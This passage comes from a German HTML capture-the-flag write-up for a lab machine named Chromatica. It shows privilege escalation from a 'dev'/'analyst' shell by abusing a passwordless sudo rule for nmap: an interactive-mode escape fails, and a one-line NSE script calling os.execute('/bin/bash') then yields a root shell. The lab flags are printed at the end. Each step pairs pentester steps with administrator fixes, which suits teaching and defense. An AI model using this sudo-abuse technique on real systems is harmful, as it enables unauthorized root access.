+<span class="password">dev@Chromatica:~$</span> <span class="command">id</span>
+<span class="password">uid=1001(dev) gid=1001(dev) groups=1001(dev)</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe zuerst den Befehl `stty rows 47 columns 94` verwendet, um die Größe der TTY für die erhaltene Shell auf Standardwerte zurückzusetzen. Dies macht die Shell wieder benutzbar für Befehle, die mehr Platz benötigen. Anschließend habe ich den Befehl `id` ausgeführt, der meine aktuelle Benutzeridentität anzeigt. Die Ausgabe bestätigt, dass ich erfolgreich eine Shell als Benutzer `dev` mit UID und GID 1001 erhalten habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell ist nun stabil und benutzbar. Die Bestätigung, dass ich als `dev` angemeldet bin, ist der Ausgangspunkt für die Privilege Escalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als Benutzer `dev`. Prüfe Dateisystemberechtigungen, suche nach SUID/SGID-Binaries, überprüfe Cronjobs, Netzwerkkonfigurationen und Konfigurationsdateien auf Anmeldedaten oder Schwachstellen. Untersuche die Sudo-Berechtigungen für den Benutzer `dev`.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass reguläre Benutzerkonten (auch Entwicklerkonten) nur minimale notwendige Berechtigungen auf dem System haben.
+            </p>
+
+            <p>
+                Ein wichtiger erster Schritt bei der systeminternen Aufklärung ist die Überprüfung der Sudo-Berechtigungen des aktuellen Benutzers. Ich habe geprüft, ob der Benutzer `dev` bestimmte Befehle mit Root-Rechten ohne Passwort ausführen darf.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">dev@Chromatica:~$</span> <span class="command">sudo -l</span>
+Matching Defaults entries for <span class="command">analyst on Chromatica:</span>
+    <span class="command">env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span>
+
+<span class="password">User analyst may run the following commands on Chromatica:</span>
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/nmap</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `sudo -l` zeigt die Sudo-Berechtigungen des aktuellen Benutzers an. Interessanterweise zeigt die Ausgabe "Matching Defaults entries for <span class="command">analyst on Chromatica</span>" und "User <span class="command">analyst</span> may run...". Dies deutet darauf hin, dass der Benutzer `dev` möglicherweise zur Gruppe `analyst` gehört oder dass die Sudo-Konfiguration den Benutzer `analyst` (möglicherweise ein Alias für `dev` oder ein anderer Benutzer) betrifft. Der entscheidende Eintrag ist: `<span class="password">(ALL : ALL) NOPASSWD: /usr/bin/nmap</span>`. Dies bedeutet, dass der Benutzer `analyst` (und damit wahrscheinlich auch `dev`) den Befehl `/usr/bin/nmap` als JEDER Benutzer (einschließlich `root`, durch `ALL : ALL`) **ohne Passwort** (`NOPASSWD`) ausführen darf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Hervorragend! Dies ist der klare Vektor für die Privilege Escalation zu Root. Die Möglichkeit, `nmap` als Root ohne Passwort auszuführen, ist eine kritische Fehlkonfiguration. Das `nmap` Utility selbst kann missbraucht werden, um Befehle auszuführen, wenn es mit Sudo-Berechtigungen gestartet wird. Die Inkonsistenz zwischen dem Shell-Prompt (`dev`) und dem Sudo-Output (`analyst`) ist wahrscheinlich ein Konfigurationsdetail der VM.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die Sudo-Berechtigung für `nmap`, um eine Root-Shell zu erlangen. Prüfe auf GTFOBins oder ähnlichen Seiten nach Exploits für `nmap` mit Sudo/SUID-Berechtigungen.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Entferne die Sudo-Berechtigung `NOPASSWD` für `/usr/bin/nmap` für die Benutzer `analyst` und `dev`. Überprüfe alle `sudoers`-Konfigurationen auf unsichere Einträge, insbesondere solche mit `NOPASSWD` oder für Binaries, die missbraucht werden können. Deinstalliere `nmap` vom System, falls es auf Produktionsservern nicht zwingend benötigt wird.
+            </p>
+
+            <p>
+                Basierend auf der gefundenen Sudo-Berechtigung für `nmap` ohne Passwort habe ich auf GTFOBins nach einer Methode gesucht, dies für Privilege Escalation auszunutzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+<span class="command">[Link: https://gtfobins.github.io/gtfobins/nmap/#sudo | Ziel: https://gtfobins.github.io/gtfobins/nmap/#sudo]</span>
+
+<span class="command">sudo nmap --interactive</span>
+<span class="command">nmap> !sh</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die GTFOBins-Seite für `nmap` listet unter der Sudo-Sektion verschiedene Methoden auf. Eine gängige Methode ist die Verwendung des interaktiven Modus (`--interactive`), aus dem man dann mit `!sh` oder `!bash` in eine Shell entkommen kann. Der bereitgestellte Befehl zeigt genau dies: `sudo nmap --interactive`, gefolgt von der Eingabe `!sh` in der interaktiven Nmap-Shell.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> GTFOBins liefert eine bewährte Methode, um die gefundene Sudo-Berechtigung auszunutzen. Der bereitgestellte Befehl ist einfach anzuwenden und sollte direkt zu einer Root-Shell führen, WENN die Nmap-Version den interaktiven Modus unterstützt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche den `--interactive` Exploit zuerst. Wenn das nicht funktioniert, suche nach alternativen `nmap` Sudo-Exploits auf GTFOBins oder anderswo, wie z.B. die Ausführung von NSE-Skripten.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung basierend auf diesem Schritt, außer der Hauptempfehlung zur Sudo-Berechtigung selbst.
+            </p>
+
+            <p>
+                Ich habe versucht, den von GTFOBins vorgeschlagenen interaktiven Modus-Exploit für `nmap` zu nutzen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">analyst@Chromatica:~$</span> <span class="command">sudo /usr/bin/nmap --interactive</span>
+<span class="password">/usr/bin/nmap: unrecognized <span class="command">OPTION</span> '--interactive'</span>
+See the output of nmap -h for a summary of <span class="command">OPTIONS</span>.
+</pre>
+                </div>
+            </div>
+            <p>
+                die version ist zu alt für diesen cheat..<br>
+                wir müssen einen anderen cheat verwenden...
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Befehl `sudo /usr/bin/nmap --interactive` ausgeführt, um Nmap mit Root-Rechten im interaktiven Modus zu starten. Die Ausgabe zeigt jedoch eine Fehlermeldung: "/usr/bin/nmap: unrecognized option '--interactive'". Dies bedeutet, dass die auf dem System installierte Nmap-Version (vermutlich die aus der vollen Nmap-Ausgabe: 7.80) die Option `--interactive` nicht unterstützt. Der Text stellt fest, dass die Version zu alt für diesen "Cheat" ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erste Versuch, den Sudo-Exploit für `nmap` zu nutzen, ist fehlgeschlagen, da die Nmap-Version veraltet ist und die notwendige Option fehlt. Dies blockiert diesen spezifischen Weg zur Root-Rechteausweitung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche auf GTFOBins nach alternativen Wegen, `nmap` mit Sudo zu missbrauchen, insbesondere Methoden, die die NSE (Nmap Scripting Engine) nutzen, da dies auch in älteren Versionen oft möglich ist.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere `nmap` auf die neueste Version, falls es benötigt wird. Die Hauptempfehlung bleibt jedoch, die unsichere Sudo-Regel zu entfernen.
+            </p>
+
+            <p>
+                Da der interaktive Modus von `nmap` nicht funktionierte, musste ich eine alternative Methode finden, um die Sudo-Berechtigung auszunutzen. Eine andere gängige Technik ist die Verwendung der Nmap Scripting Engine (NSE), um Befehle auszuführen. Ich kann ein kleines NSE-Skript erstellen, das einfach eine Shell ausführt, und dieses Skript dann mit Sudo über Nmap ausführen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+<span class="password">analyst@Chromatica:~$</span> <span class="command">echo 'os.execute("/bin/bash")' > /tmp/shell.nse</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+<span class="password">analyst@Chromatica:~$</span> <span class="command">sudo /usr/bin/nmap --script=/tmp/shell.nse</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Starting Nmap <span class="command">7.80 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at 2025-06-13 21:30 UTC</span>
+<span class="password">root@Chromatica:/home/analyst#</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe zuerst ein kleines NSE-Skript in `/tmp/shell.nse` erstellt, das den Lua-Code `os.execute("/bin/bash")` enthält. Dieser Code weist Nmap an, das angegebene Systemkommando auszuführen. Dann habe ich Nmap mit `sudo /usr/bin/nmap --script=/tmp/shell.nse` ausgeführt. Durch `sudo` wird Nmap mit Root-Berechtigungen gestartet. Da das Skript mit Root-Berechtigungen ausgeführt wird, führt `os.execute("/bin/bash")` eine Bash-Shell mit Root-Rechten aus. Die Ausgabe zeigt den Start von Nmap und direkt darunter die Root-Shell-Eingabeaufforderung (`<span class="password">root@Chromatica:/home/analyst#</span>`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die alternative Ausnutzung der Sudo-Berechtigung für `nmap` mittels eines NSE-Skripts war erfolgreich. Ich habe nun eine Shell mit den höchsten Berechtigungen auf dem System – Root! Dies ist der erfolgreiche Abschluss der Privilege Escalation Phase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sammle die Root-Flag und führe notwendige Post-Exploitation-Schritte durch. Dokumentiere den Weg zum Root sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> **Sofortige Maßnahme:** Entferne die unsichere Sudo-Regel für `nmap`. Implementiere Richtlinien, die das Ausführen beliebiger Skripte durch privilegierte Programme verhindern, falls möglich.
+            </p>
+
+            <p>
+                Nachdem ich Root-Zugriff erlangt hatte, war mein primäres Ziel, die Root-Flag zu finden. Ich wechselte in das Home-Verzeichnis des Root-Benutzers, da die Root-Flag dort oft abgelegt wird.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">root@Chromatica:/home/analyst#</span> <span class="command">cd ~</span>
+<span class="password">root@Chromatica:~#</span> <span class="command">ls -la </span>
+<span class="command">total 104</span>
+<span class="command">drwx------  9 root root  4096 Apr 18  2024 .</span>
+<span class="command">drwxr-xr-x 19 root root  4096 Apr 17  2024 ..</span>
+<span class="command">-rw-------  1 root root 23147 Apr 18  2024 .bash_history</span>
+<span class="command">-rw-r--r--  1 root root  3106 Oct 15  2021 .bashrc</span>
+<span class="command">drwx------  2 root root  4096 Mar 21  2023 .cache</span>
+<span class="command">drwxr-xr-x  3 root root  4096 Mar 21  2023 .config</span>
+<span class="command">drwx------  3 root root  4096 Mar 21  2023 .gnupg</span>
+<span class="command">-rw-------  1 root root    20 Aug 29  2023 .lesshst</span>
+<span class="command">drwxr-xr-x  3 root root  4096 Mar 21  2023 .local</span>
+<span class="command">-rw-------  1 root root  4897 Mar 28  2023 .mysql_history</span>
+<span class="command">-rw-r--r--  1 root root   161 Jul  9  2019 .profile</span>
+<span class="command">-rw-r--r--  1 root root    35 May 23  2023 root.<span class="command">txt</span></span>
+<span class="command">drwx------  4 root root  4096 Mar 21  2023 snap</span>
+<span class="command">drwx------  2 root root  4096 Aug 29  2023 .ssh</span>
+<span class="command">drwxr-xr-x  2 root root  4096 Mar 24  2023 .vim</span>
+<span class="command">-rw-------  1 root root 15398 Apr 18  2024 .viminfo</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `cd ~` navigiert in das Home-Verzeichnis des aktuellen Benutzers, was in diesem Fall `/root/` ist. Der Befehl `ls -la` listet alle Dateien und Verzeichnisse in diesem Verzeichnis auf, einschließlich versteckter Dateien und deren Berechtigungen. Die Ausgabe zeigt eine Datei namens `<span class="command">root.txt</span>`. Die Berechtigungen (`-rw-r--r--`) zeigen, dass der Root-Benutzer die Datei lesen und schreiben darf, während andere nur Leseberechtigung haben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden von `root.txt` im Home-Verzeichnis des Root-Benutzers ist ein klarer Hinweis auf die Root-Flag. Da ich als Root angemeldet bin, habe ich die notwendigen Berechtigungen, um diese Datei zu lesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese den Inhalt der Datei `root.txt`, um die Root-Flag zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass sensible Dateien (wie Root-Flags) sicher gespeichert und nur für autorisierte Benutzer zugänglich sind (obwohl im Falle der Root-Flag Root-Zugriff erwartet wird).
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/analyst/user.txt</div>
+                    <div class="flag-value"><span class="password">brightctf{DIR_EN_GREY_59ce1d6c207}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">1b56eefaab2c896e57c874a635b24b49</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben C - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. Juni 2025</p>
+    </footer>
+ 
+
+</body>
+</html>
